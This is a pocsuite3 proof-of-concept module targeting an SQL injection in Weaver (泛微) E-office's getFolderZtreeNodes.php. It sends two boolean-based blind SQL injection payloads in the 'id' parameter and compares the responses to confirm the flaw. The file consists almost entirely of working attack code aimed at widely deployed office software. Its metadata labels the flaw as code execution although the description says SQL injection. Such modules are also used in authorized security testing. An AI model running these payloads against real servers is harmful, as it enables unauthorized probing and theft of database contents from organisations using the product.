from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict

class TestPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '泛微 E-office getFolderZtreeNodes.php 存在SQL注入漏洞'
    appName = '泛微 e-cology'
    appVersion = 'All'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''泛微旗下标准协同办公平台 e-office产品，全方位覆盖日常办公场景有效提升组织管理与协同效率。E-office getFolderZtreeNodes.php存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
            "Origin": self.url,
            "Referer": self.url,
            "Content-Type": "application/x-www-form-urlencoded"
        }
        path = '''/general/system/file_folder/purview_new/getFolderZtreeNodes.php'''
        inject_data1 = '''id=(SELECT (CASE WHEN (length(database())>0) THEN 1 ELSE (SELECT 9469 UNION SELECT 1668) END))&lv=0&n=&param=eyJmaWxlU29ydCI6bnVsbCwicm9vdCI6eyJuYW1lIjpudWxsLCJjaGVjayI6dHJ1ZSwidXJsIjoiL2dlbmVyYWwvZmlsZV9mb2xkZXIvZmlsZV9uZXcvZmlsZWxpc3QucGhwP1NPUlRfSUQ9MCZGSUxFX1NPUlQ9IiwidGFyZ2V0IjoiZmlsZV9tYWluIiwicmlnaHRDbGljayI6ZmFsc2V9LCJub2RlIjp7InJpZ2h0Q2xpY2siOmZhbHNlLCJ1cmwiOiIvZ2VuZXJhbC9maWxlX2ZvbGRlci9maWxlX25ldy9maWxlbGlzdC5waHAiLCJ0YXJnZXQiOiJmaWxlX21haW4iLCJsb2FkQWxsIjpmYWxzZX0sInNlbGVjdCI6eyJzb3J0aWQiOm51bGwsInNvcnRuYW1lIjpudWxsLCJnZXR3aGF0IjpudWxsLCJmaWxlc29ydCI6bnVsbCwiY2xpY2tGdW4iOiJzZWxlY3RfZm9sZGVyIn19'''
        inject_data2 = '''id=(SELECT (CASE WHEN (length(database())<0) THEN 1 ELSE (SELECT 9469 UNION SELECT 1668) END))&lv=0&n=&param=eyJmaWxlU29ydCI6bnVsbCwicm9vdCI6eyJuYW1lIjpudWxsLCJjaGVjayI6dHJ1ZSwidXJsIjoiL2dlbmVyYWwvZmlsZV9mb2xkZXIvZmlsZV9uZXcvZmlsZWxpc3QucGhwP1NPUlRfSUQ9MCZGSUxFX1NPUlQ9IiwidGFyZ2V0IjoiZmlsZV9tYWluIiwicmlnaHRDbGljayI6ZmFsc2V9LCJub2RlIjp7InJpZ2h0Q2xpY2siOmZhbHNlLCJ1cmwiOiIvZ2VuZXJhbC9maWxlX2ZvbGRlci9maWxlX25ldy9maWxlbGlzdC5waHAiLCJ0YXJnZXQiOiJmaWxlX21haW4iLCJsb2FkQWxsIjpmYWxzZX0sInNlbGVjdCI6eyJzb3J0aWQiOm51bGwsInNvcnRuYW1lIjpudWxsLCJnZXR3aGF0IjpudWxsLCJmaWxlc29ydCI6bnVsbCwiY2xpY2tGdW4iOiJzZWxlY3RfZm9sZGVyIn19'''
        inject_url = self.url+path
        inject1_resp = requests.post(url=inject_url, headers=headers, verify=False, data=inject_data1, allow_redirects=False, timeout=20)
        inject2_resp = requests.post(url=inject_url, headers=headers, verify=False, data=inject_data2, allow_redirects=False, timeout=20)
        if inject1_resp.status_code == 302 and inject2_resp.status_code ==302 and inject1_resp.text != inject2_resp.text and "folder.class.php" not in inject1_resp.text and "folder.class.php" in inject2_resp.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = inject_url
        return self.parse_output(result)

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
